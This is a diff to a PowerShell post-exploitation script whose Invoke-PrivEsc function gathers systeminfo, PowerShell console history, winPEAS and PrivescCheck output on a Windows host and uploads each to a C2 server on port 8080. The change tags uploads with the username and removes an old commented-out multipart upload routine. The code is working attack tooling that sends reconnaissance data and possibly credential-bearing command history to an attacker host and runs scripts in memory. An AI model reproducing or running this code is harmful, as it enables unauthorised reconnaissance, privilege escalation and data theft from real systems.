@@ -14,7 +14,7 @@ function Invoke-PrivEsc {
     # 2. Collect and POST systeminfo (for wes-ng)
     # ----------------------------------------
     $sysInfo = systeminfo | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME).txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
 
 
     # ----------------------------------------
@@ -35,7 +35,7 @@ function Invoke-PrivEsc {
             $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue
             if ($psHist) {
                 # Invoke-WebRequest -UseBasicParsing -Uri "http://$($C2):8080/g" -Method Post -Body ($psHist -join "`r`n") | Out-Null
-                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME).txt" | Out-Null
+                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
             }
         } catch { }
     }
@@ -76,7 +76,7 @@ function Invoke-PrivEsc {
     # Restore console output
     [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
-    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME).txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
 
     # ----------------------------------------
     # 6. Run PrivescCheck.ps1 in-memory → POST separately
@@ -85,7 +85,7 @@ function Invoke-PrivEsc {
     Invoke-Expression $privCheck
     $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)"
     $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME).txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
     Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
 
     # ----------------------------------------
@@ -144,47 +144,3 @@ function Invoke-FileUpload {
         Write-Error "Upload failed: $_"
     }
 }
-
-
-# function Invoke-FileUpload {
-#     param(
-#         [Parameter(Mandatory=$true)]
-#         [string]$FilePath,
-
-#         [Parameter(Mandatory=$true)]
-#         [string]$C2
-#     )
-
-#     try {
-#         if (-not (Test-Path $FilePath)) {
-#             Write-Error "File not found: $FilePath"
-#             return
-#         }
-
-#         # Construct upload URL
-#         $Url = "http://$($C2):8080/p"
-
-#         # Create a random boundary string
-#         $Boundary = [System.Guid]::NewGuid().ToString()
-#         $LF = "`r`n"
-
-#         # Build multipart body manually
-#         $FileName = [System.IO.Path]::GetFileName($FilePath)
-#         $FileContent = Get-Content -Raw -Path $FilePath
-
-#         $Body  = "--$Boundary$LF"
-#         $Body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
-#         $Body += "Content-Type: text/plain$LF$LF"
-#         $Body += $FileContent + $LF
-#         $Body += "--$Boundary--$LF"
-
-#         # Send the request
-#         Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing
-
-#         Write-Host "[*] Uploaded $FilePath to $Url"
-#     }
-#     catch {
-#         Write-Error "Upload failed: $_"
-#     }
-# }
-
